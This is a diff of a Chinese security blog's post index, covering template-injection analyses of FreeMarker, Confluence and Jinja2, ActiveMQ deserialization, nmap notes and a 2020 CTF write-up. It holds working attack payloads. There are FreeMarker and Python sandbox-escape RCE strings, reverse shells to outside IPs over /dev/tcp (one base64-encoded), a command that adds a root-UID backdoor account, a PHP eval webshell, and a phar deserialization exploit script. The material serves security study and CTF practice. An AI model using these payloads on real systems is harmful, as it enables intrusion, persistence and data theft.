+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112728222-13161049.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908112728222-13161049.png" alt="img"></a></p>
+<p>跟进 StringReader 方法查看详情：<br><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908113941507-617770245.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908113941507-617770245.png" alt="img"></a></p>
+<p>（reader -&gt; nodeTree）继续跟进 this.evaluate() 方法</p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908115525966-63941808.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908115525966-63941808.png" alt="img"></a></p>
+<p>（nodeTree -&gt; writer）继续跟进render方法</p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908141827072-400777989.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908141827072-400777989.png" alt="img"></a></p>
+<p>emmm…继续跟进render</p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908142340601-1472158535.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908142340601-1472158535.png" alt="img"></a></p>
+<p>继续看render方法</p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908143916739-984676483.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908143916739-984676483.png" alt="img"></a></p>
+<p>跟进execute方法</p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908144606960-964942274.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200908144606960-964942274.png" alt="img"></a></p>
+<p>可以看到这是最后一步了，调试结束就可以看到poc已经成功被执行，看一下上图中的for循环的代码，大概意思是当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE</p>
+<p><strong>Confluence 未授权RCE分析（CVE-2019-3396）</strong></p>
+<p>根据官方文档的描述，可以看到这是由 widget Connector 这个插件造成的SSTI，利用SSTI而造成的RCE。在经过diff后，可以确定触发漏洞的关键点在于对post包中的_template字段</p>
+<p>具体漏洞代码调试可以参考：《<a href="https://caiqiqi.github.io/2019/11/03/Confluence%E6%9C%AA%E6%8E%88%E6%9D%83%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2019-3396/">Confluence未授权模板注入/代码执行(CVE-2019-3396)</a>》</p>
+<p>　　　　　　　　　　　　　《[Confluence 未授权RCE分析（CVE-2019-3396）](<a href="https://lucifaer.com/2019/04/16/Confluence">https://lucifaer.com/2019/04/16/Confluence</a> 未授权RCE分析（CVE-2019-3396）/#0x01-漏洞概述)》</p>
+<p><strong><em>4\</em></strong>|<strong><em>2**</em></strong>FreeMarker**</p>
+<p>FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200909230452926-1382441572.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200909230452926-1382441572.png" alt="img"></a></p>
+<p><strong>FreeMarker模板代码</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Welcome!&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;　&lt;#–这是注释–&gt;</span><br><span class="line">  &lt;h1&gt;Welcome $&#123;user&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">  &lt;p&gt;Our latest product:</span><br><span class="line">  &lt;a href&#x3D;&quot;$&#123;latestProduct.url&#125;&quot;&gt;$&#123;latestProduct.name&#125;&lt;&#x2F;a&gt;!</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>模板文件存放在Web服务器上，就像通常存放静态HTML页面那样。当有人来访问这个页面， FreeMarker将会介入执行，然后动态转换模板，用最新的数据内容替换模板中 ${…} 的部分， 之后将结果发送到访问者的Web浏览器中。</p>
+<p>这个模板主要用于 java ，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象</p>
+<p>具体的高级内置函数定义参考《<a href="https://freemarker.apache.org/docs/ref_builtins_expert.html">Seldom used and expert built-ins</a>》</p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911000148374-491461162.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911000148374-491461162.png" alt="img"></a></p>
+<p>主要的用法如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;＃ - 创建一个用户定义的指令，调用类的参数构造函数 - &gt;</span><br><span class="line">&lt;#assign word_wrapp &#x3D;&quot;com.acmee.freemarker.WordWrapperDirective&quot;?new（）&gt;</span><br><span class="line">&lt;＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - &gt;</span><br><span class="line">&lt;#assign word_wrapp_narrow &#x3D;&quot;com.acmee.freemarker.WordWrapperDirective&quot;?new（40）&gt;</span><br></pre></td></tr></table></figure>
+
+<p>调用了构造函数创建了一个对象，那么这个 payload 中就是调用的 freemarker 的内置执行命令的对象 Execute</p>
+<p>freemarker.template.utility 里面有个Execute类，这个类会执行它的参数，因此我们可以利用new函数新建一个Execute类，传输我们要执行的命令作为参数，从而构造远程命令执行漏洞。构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>freemarker.template.utility 里面有个ObjectConstructor类，如下图所示，这个类会把它的参数作为名称，构造了一个实例化对象。因此我们可以构造一个可执行命令的对象，从而构造远程命令执行漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;calc.exe&quot;).start()</span><br></pre></td></tr></table></figure>
+
+<p>freemarker.template.utility 里面的JythonRuntime，可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc.exe&quot;)&lt;&#x2F;@value&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用测试代码来大概演示一下：<a href="https://github.com/hellokoding/springboot-freemarker">https://github.com/hellokoding/springboot-freemarker</a></p>
+<p>代码演示说明：<a href="https://hellokoding.com/spring-boot/freemarker/">https://hellokoding.com/spring-boot/freemarker/</a></p>
+<p>前端代码　　——&gt;　　hello.ftl</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Hello $&#123;name&#125;!&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;&#x2F;css&#x2F;main.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2 class&#x3D;&quot;hello-title&quot;&gt;Hello $&#123;name&#125;!&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;&#x2F;js&#x2F;main.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>后端代码　　——&gt;　　HelloController.java：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package com.backendvulnerabilities.ssti;</span><br><span class="line"></span><br><span class="line">import freemarker.cache.MultiTemplateLoader;</span><br><span class="line">import freemarker.cache.StringTemplateLoader;</span><br><span class="line">import freemarker.cache.TemplateLoader;</span><br><span class="line">import freemarker.template.Configuration;</span><br><span class="line">import freemarker.template.Template;</span><br><span class="line">import freemarker.template.TemplateException;</span><br><span class="line">import freemarker.template.utility.DateUtil;</span><br><span class="line">import org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.ui.Model;</span><br><span class="line">import org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.StringWriter;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class HelloController &#123;</span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line">    private  Configuration con;</span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;&#x2F;&quot;)</span><br><span class="line">    public String index() &#123;</span><br><span class="line">        return &quot;index&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(value &#x3D; &quot;&#x2F;hello&quot;)</span><br><span class="line">    public String hello(@RequestBody Map&lt;String,Object&gt; body, Model model) &#123;</span><br><span class="line">        model.addAttribute(&quot;name&quot;, body.get(&quot;name&quot;));</span><br><span class="line">        return &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(value &#x3D; &quot;&#x2F;freemarker&quot;)</span><br><span class="line">    public void freemarker(@RequestParam(&quot;username&quot;) String username, HttpServletRequest httpserver,HttpServletResponse response) &#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            String data &#x3D; &quot;1ooooooooooooooooooo~&quot;;</span><br><span class="line">            String templateContent &#x3D; &quot;&lt;html&gt;&lt;body&gt;Hello &quot; + username + &quot; $&#123;data&#125;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&quot;;</span><br><span class="line">            String html &#x3D; createHtmlFromString(templateContent,data);</span><br><span class="line">            response.getWriter().println(html);</span><br><span class="line"></span><br><span class="line">            &#125;catch (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private String createHtmlFromString(String templateContent, String data) throws IOException, TemplateException &#123;</span><br><span class="line">        Configuration cfg &#x3D; new Configuration();</span><br><span class="line">        StringTemplateLoader stringLoader &#x3D; new StringTemplateLoader();</span><br><span class="line">        stringLoader.putTemplate(&quot;myTemplate&quot;,templateContent);</span><br><span class="line">        cfg.setTemplateLoader(stringLoader);</span><br><span class="line">        Template template &#x3D; cfg.getTemplate(&quot;myTemplate&quot;,&quot;utf-8&quot;);</span><br><span class="line">        Map root &#x3D; new HashMap();</span><br><span class="line">        root.put(&quot;data&quot;,data);</span><br><span class="line"></span><br><span class="line">        StringWriter writer &#x3D; new StringWriter();</span><br><span class="line">        template.process(root,writer);</span><br><span class="line">        return writer.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(value &#x3D; &quot;&#x2F;template&quot;, method &#x3D;  RequestMethod.POST)</span><br><span class="line">    public String template(@RequestBody Map&lt;String,String&gt; templates) throws IOException &#123;</span><br><span class="line">        StringTemplateLoader stringLoader &#x3D; new StringTemplateLoader();</span><br><span class="line">        for(String templateKey : templates.keySet())&#123;</span><br><span class="line">            stringLoader.putTemplate(templateKey, templates.get(templateKey));</span><br><span class="line">        &#125;</span><br><span class="line">        con.setTemplateLoader(new MultiTemplateLoader(new TemplateLoader[]&#123;stringLoader,</span><br><span class="line">            con.getTemplateLoader()&#125;));</span><br><span class="line">        return &quot;index&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述代码主要编译给定的模板字符串和数据，生成HTML进行输出</p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911153736602-1300404619.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911153736602-1300404619.png" alt="img"></a></p>
+<p>模板注入的前提是在无过滤的情况下，使用模板来解析我们输入的字符，可以通过页面上的变化，来判断我们输入的内容是否被解析，如上图我们输入的内容被成功解析到页面上，并且没有过滤。</p>
+<p>首先需要控制被攻击模板 /template 的内容，也就是要将本来无危害的模板文件实时更改为可攻击的模板内容。使用的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;hello.ftl&quot;: &quot;&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;\&quot;en\&quot;&gt;&lt;head&gt;&lt;meta charset&#x3D;\&quot;UTF-8\&quot;&gt;&lt;#assign ex&#x3D;\&quot;freemarker.template.utility.Execute\&quot;?new()&gt; $&#123; ex(\&quot;ping ilxwh0.dnslog.cn\&quot;) &#125;&lt;title&gt;Hello!&lt;&#x2F;title&gt;&lt;link href&#x3D;\&quot;&#x2F;css&#x2F;main.css\&quot; rel&#x3D;\&quot;stylesheet\&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;h2 class&#x3D;\&quot;hello-title\&quot;&gt;Hello!&lt;&#x2F;h2&gt;&lt;script src&#x3D;\&quot;&#x2F;js&#x2F;main.js\&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911170426315-957198191.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911170426315-957198191.png" alt="img"></a></p>
+<p>关键代码在上图的红框中，接收用户传入的参数，使用keySet()获取key值，遍历相应的模块名字，使用StringTemplateLoader来加载模板内容，并使用putTemplate将key对应的value（也就是payload）写入templateKey中。这样就可以覆盖 hello.ftl 文件的内容，具体如下：</p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911171827668-2059326925.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911171827668-2059326925.png" alt="img"></a></p>
+<p>重新更改了加载的模板内容后，然后直接访问受影响的模板文件路径，此时恶意的模板文件内容就会被加载成功了，并执行了系统命令</p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173804255-14835990.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173804255-14835990.png" alt="img"></a></p>
+<p>dnslog平台也受到了请求</p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173946071-111351701.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200911173946071-111351701.png" alt="img"></a></p>
 <h2 id="二、开始运用"><a href="#二、开始运用" class="headerlink" title="二、开始运用"></a>二、开始运用</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2354192/1599480440997-00e10dda-bb44-4fe7-9b87-2a8de03b598d.png"></p>
 <p>这张图可以说是百试百灵了，然后接下来我们继续根据不同的模版和语言特性进行常用payload的使用总结</p>
 <h3 id="Jinja2使用"><a href="#Jinja2使用" class="headerlink" title="Jinja2使用"></a>Jinja2使用</h3><h3 id="1-flask的全局变量"><a href="#1-flask的全局变量" class="headerlink" title="1.flask的全局变量"></a>1.flask的全局变量</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config 保存着隐私信息</span><br><span class="line">config.from_object(&#39;os&#39;) </span><br><span class="line">request.environ是一个字典，其中包含和服务器环境相关的对象 </span><br></pre></td></tr></table></figure>
@@ -249,6 +421,11 @@
 
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">绕waf</span><br><span class="line">python2：</span><br><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#39;os.system(&quot;ls&quot;)&#39;)</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;func_global&#39;+&#39;s&#39;)[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.6.6.6&#x2F;9999 0&gt;&amp;1&quot;&#39;)</span><br><span class="line"></span><br><span class="line">python3：</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;]</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;__global&#39;+&#39;s__&#39;)[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;)</span><br></pre></td></tr></table></figure>
 
+<p>参考资料</p>
+<p><strong>国内资料</strong></p>
+<p>Python方面：<a href="https://www.anquanke.com/post/id/188172">SSTI/沙盒逃逸详细总结</a><a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a><br>                                <a href="https://p0sec.net/index.php/archives/120/">Flask/Jinja2模板注入中的一些绕过姿势</a><br>        PHP方面：<a href="https://www.freebuf.com/vuls/83999.html">服务端模板注入攻击 （SSTI）之浅析</a></p>
+<p><strong>国外资料</strong></p>
+<p>这篇总结的比较全面：<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf">Server-Side Template Injection: RCE for the modern webapp</a><br>        Python方面：<a href="https://0day.work/jinja2-template-injection-filter-bypasses/">Jinja2 template injection filter bypasses</a></p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -856,6 +1033,12 @@
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;12340&gt;&amp;1&quot; -Yp ROME 127.0.0.1   61616</span><br></pre></td></tr></table></figure>
 
 <p>外面用nc监听1234端口</p>
+<p>注意把攻击的命令进行base64编码，绕过java本身的限制</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQzLjE5Mi83Nzc3IDA+JjE&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 192.168.43.192 61616</span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">useradd -g root -s &#x2F;bin&#x2F;bash -u 10010 test</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sed -i &quot;s&#x2F;test:x:10010&#x2F;test:x:0&#x2F;g&quot; &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
@@ -932,6 +1115,57 @@
       <tags>
         <tag>编程</tag>
         <tag>ThinkPHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>随笔小记</title>
+    <url>/2020/09/25/%E9%9A%8F%E7%AC%94%E5%B0%8F%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="记nmap使用的几个小点"><a href="#记nmap使用的几个小点" class="headerlink" title="记nmap使用的几个小点"></a>记nmap使用的几个小点</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-oN 标准保存</span><br><span class="line">-oX XML保存</span><br><span class="line">-oG Grep保存  nmap -F -oG test.txt 192.168.23.1 以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。</span><br><span class="line">-oA 保存到所有格式  nmap -F -oA test 192.168.3.2</span><br><span class="line">-append-output 补充保存文件</span><br></pre></td></tr></table></figure>
+
+<h2 id="构造webshell时的小点"><a href="#构造webshell时的小点" class="headerlink" title="构造webshell时的小点"></a>构造webshell时的小点</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当php，三个字被过滤时，可以使用短符号</span><br><span class="line">&lt;?&#x3D;来代替&lt;?php进行绕过</span><br></pre></td></tr></table></figure>
+
+<p><code>&#39; &lt;?= @eval($_POST[&quot;cmd&quot;]);?&gt;</code> -oG shell.phtml ‘</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>巅峰极客2020</title>
+    <url>/2020/09/28/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020/</url>
+    <content><![CDATA[<h1 id="2020巅峰极客部分WP"><a href="#2020巅峰极客部分WP" class="headerlink" title="2020巅峰极客部分WP"></a>2020巅峰极客部分WP</h1><p>参考链接:<a href="https://www.gem-love.com/ctf/2634.html">https://www.gem-love.com/ctf/2634.html</a></p>
+<p>主要不是题目的解答，看了颖奇大佬的文章，再根据自己在做题目的过程中记忆，对题目单纯的进行理论上的复现，原理是一样的</p>
+<h2 id="BabyPhp2"><a href="#BabyPhp2" class="headerlink" title="BabyPhp2"></a>BabyPhp2</h2><p>打开题目</p>
+<p><img src="https://i.loli.net/2020/09/28/V6MiunxmdfpzkEC.png"></p>
+<p>这里提示已经很明显了，这里登陆不上的。</p>
+<p>然后扫目录，得到<a href="http://www.zip,源码泄漏,然后打开源码,进行源码的分析/">www.zip，源码泄漏，然后打开源码，进行源码的分析</a></p>
+<p><img src="https://i.loli.net/2020/09/28/zUTKC5ySladEGtF.png"></p>
+<p>文件读取的漏洞，但是这个读取方法里面的有waf，魔术方法就需要制造调用，构建POP链。现在就是要找到这个链头了。</p>
+<p><img src="https://i.loli.net/2020/09/28/Xar8jLGyDCcxM2e.png"></p>
+<p>有一个魔术方法之中有修改的内容，可以这里是可以利用，接下来就是想办法将 这个地方包含进来还要执行这条链。剩下的就是<code>file_get_contents</code>这个函数了。利用伪协议将php文件读取进来，还要能够执行。<code>phar</code>伪协议满足要求。但是</p>
+<p><img src="https://i.loli.net/2020/09/28/QN7ylUWLEfZrwCu.png"></p>
+<p>已经被销毁了。这里提醒一下，伪协议是可以联合使用的。</p>
+<p><code>compress.zlib://phar://</code></p>
+<p>这样就可以绕过限制读取文件，再加上那个upload.php上传的时候改一个名字，问题也就解决了。下面贴上大佬的脚本。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age&#x3D;null;</span><br><span class="line">    public $nickname&#x3D;null;</span><br><span class="line">    public $backup;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname &#x3D; new Reader();</span><br><span class="line">        $this-&gt;backup &#x3D; &quot;&#x2F;flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $token;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;token &#x3D; new User;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Reader&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$y1ng &#x3D; new dbCtrl();</span><br><span class="line"></span><br><span class="line">$phar &#x3D; new Phar(&quot;web1.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">$phar-&gt;setMetadata($y1ng);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">@rename(&quot;web1.phar&quot;, &quot;y1ng.gif&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>之后将gif上传即可</p>
+<p><img src="https://i.loli.net/2020/09/28/2pFyVEOhMnDPSwd.png"></p>
+<p>这里利用是否有序列化的数据出现判断是否协议生效，这样就可以调节文件路径到底是怎样的。</p>
+<p>phar反序列参考链接：<a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
+<h1 id="MeowWorld"><a href="#MeowWorld" class="headerlink" title="MeowWorld"></a>MeowWorld</h1><p>这道题有个Hint：<code>register_argc_argv</code></p>
+<p>然后这个题很容易看出漏洞是本地文件包含，并且限制了包含的目录，就别想逃出来了。</p>
+<p>然后就是利用pear这个包管理器，下载我们自己的马儿，然后，包含，来命令执行。</p>
+<p><img src="https://i.loli.net/2020/09/28/yDpaCFUfLvwQm2E.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.php?f&#x3D;&#x2F;usr&#x2F;share&#x2F;pear&#x2F;pearcmd&amp;+list</span><br></pre></td></tr></table></figure>
+
+<p>这个就相当于在本地运行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pear list</span><br></pre></td></tr></table></figure>
+
+<p>这样也就不难猜到提示词的用意了。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
       </tags>
   </entry>
 </search>
